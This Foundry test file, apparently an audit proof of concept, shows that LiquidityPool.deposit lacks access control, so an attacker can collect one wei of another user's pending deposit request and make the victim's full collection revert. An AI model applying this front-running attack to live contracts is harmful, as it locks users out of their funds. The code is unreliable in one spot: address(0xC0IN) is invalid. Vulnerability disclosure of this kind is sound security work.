// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

// Foundry
import "forge-std/Test.sol";

// System under test
import "../../src/LiquidityPool.sol";

// -------------------------------------------------------------
// Dummy / helper contracts
// -------------------------------------------------------------

// Minimal unrestricted tranche-token implementation
contract MockShare {
    string public name = "Mock Share";
    string public symbol = "MSH";
    uint8  public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /* ----------------------------------------------------------- */
    /*                         ERC-20 logic                        */
    /* ----------------------------------------------------------- */

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ERC20/insufficient-allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20/insufficient-balance");
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        emit Transfer(from, to, amount);
    }

    /* ----------------------------------------------------------- */
    /*                    Mint / burn for tests                    */
    /* ----------------------------------------------------------- */

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
        totalSupply   += amount;
        emit Transfer(address(0), to, amount);
    }

    function burn(address from, uint256 amount) public {
        require(balanceOf[from] >= amount, "ERC20/insufficient-balance");
        balanceOf[from] -= amount;
        totalSupply     -= amount;
        emit Transfer(from, address(0), amount);
    }

    /* ----------------------------------------------------------- */
    /*        Functions required by LiquidityPool interfaces       */
    /* ----------------------------------------------------------- */

    function checkTransferRestriction(address, address, uint256) external pure returns (bool) {
        return true; // no restrictions
    }

    // dummy permit interface – not used in PoC
    function permit(address, address, uint256, uint256, uint8, bytes32, bytes32) external {}
    function PERMIT_TYPEHASH() external pure returns (bytes32) { return bytes32(0); }
    function DOMAIN_SEPARATOR() external pure returns (bytes32) { return bytes32(0); }
}

// Extremely simplified InvestmentManager that enforces
// deposit-request / collect flow similar to production logic.
contract MockInvestmentManager {
    mapping(address => uint256) public depositRequest; // requested asset amount per user

    address public immutable share; // tranche token we mint

    constructor(address _share) {
        share = _share;
    }

    /* ========== Asynchronous request phase ========== */

    // Called via LiquidityPool.requestDeposit – simply records intent
    function requestDeposit(uint256 assets, address receiver) external {
        depositRequest[receiver] += assets;
    }

    /* ========== Collection phase (vulnerable paths) ========== */

    // Called via LiquidityPool.deposit – mints shares to receiver
    // and decreases outstanding request. Reverts if user tries to
    // collect more than requested.
    function processDeposit(address receiver, uint256 assets) external returns (uint256) {
        require(depositRequest[receiver] >= assets, "MockInvestmentManager/insufficient-request");
        depositRequest[receiver] -= assets;

        // 1:1 asset-to-share conversion for test purposes
        MockShare(share).mint(receiver, assets);
        return assets;
    }

    // ---------- Unused stubs (satisfy LiquidityPool interface) ----------
    function processMint(address receiver, uint256 shares) external returns (uint256) {
        MockShare(share).mint(receiver, shares);
        return shares;
    }
    function processWithdraw(uint256, address, address) external pure returns (uint256) { return 0; }
    function processRedeem(uint256, address, address) external pure returns (uint256) { return 0; }
    function maxDeposit(address, address) external pure returns (uint256) { return type(uint256).max; }
    function maxMint(address, address) external pure returns (uint256) { return type(uint256).max; }
    function maxWithdraw(address, address) external pure returns (uint256) { return 0; }
    function maxRedeem(address, address) external pure returns (uint256) { return 0; }
    function totalAssets(uint256, address) external pure returns (uint256) { return 0; }
    function convertToShares(uint256 assets, address) external pure returns (uint256) { return assets; }
    function convertToAssets(uint256 shares, address) external pure returns (uint256) { return shares; }
    function previewDeposit(address, address, uint256 assets) external pure returns (uint256) { return assets; }
    function previewMint(address, address, uint256 shares) external pure returns (uint256) { return shares; }
    function previewWithdraw(address, address, uint256) external pure returns (uint256) { return 0; }
    function previewRedeem(address, address, uint256) external pure returns (uint256) { return 0; }
    function requestRedeem(uint256, address) external {}
    function collectDeposit(address) external {}
    function collectRedeem(address) external {}
    function decreaseDepositRequest(uint256, address) external {}
    function decreaseRedeemRequest(uint256, address) external {}
}

// -------------------------------------------------------------
//                     Exploit demonstration
// -------------------------------------------------------------
contract ExploitTest is Test {
    LiquidityPool          pool;      // system under test
    MockShare              share;     // restricted tranche token
    MockInvestmentManager  manager;   // mocked back-end

    address alice = address(0xA11CE); // honest user
    address bob   = address(0xB0B);   // malicious actor

    /* ----------------------------------------------------------- */
    /*                            Setup                            */
    /* ----------------------------------------------------------- */
    function setUp() public {
        // Deploy share token and investment manager
        share   = new MockShare();
        manager = new MockInvestmentManager(address(share));

        // Deploy LiquidityPool – asset address can be anything
        pool = new LiquidityPool(
            1,                  // poolId
            0x1111222233334444, // trancheId
            address(0xC0IN),    // underlying asset (irrelevant for PoC)
            address(share),     // tranche token
            address(manager)    // mocked manager
        );

        // Give labels for nice traces
        vm.label(alice, "Alice");
        vm.label(bob,   "Bob");
    }

    /* ----------------------------------------------------------- */
    /*                VULNERABILITY / EXPLOIT TEST                 */
    /* ----------------------------------------------------------- */

    // Demonstrates that anybody can front-run & partially collect
    // somebody else’s outstanding deposit, causing a permanent DoS
    // for the original user.
    function test_DoS_via_UnrestrictedDeposit() public {
        uint256 aliceRequest = 100 ether;

        /* ========== Honest user submits deposit request ========== */
        vm.startPrank(alice);
        pool.requestDeposit(aliceRequest, alice); // locks 100 assets in escrow (mock only records intent)
        vm.stopPrank();

        // Sanity: internal state shows outstanding request
        assertEq(manager.depositRequest(alice), aliceRequest, "request not recorded");

        /* ========== Attacker front-runs collection ========== */
        vm.prank(bob);
        // Bob processes a tiny part (1 wei) of Alice’s request *without owning any assets*
        pool.deposit(1, alice); // <-- unrestricted: no access control, no token cost

        // After attacker’s call only 100 ether - 1 wei is left to collect
        assertEq(manager.depositRequest(alice), aliceRequest - 1, "unexpected remaining request");
        // Alice received 1 share she did not expect
        assertEq(share.balanceOf(alice), 1, "unexpected share balance");

        /* ========== Alice tries to collect her originally requested amount ========== */
        vm.startPrank(alice);
        vm.expectRevert("MockInvestmentManager/insufficient-request");
        pool.deposit(aliceRequest, alice); // reverts because only (aliceRequest - 1) remain
        vm.stopPrank();
    }
}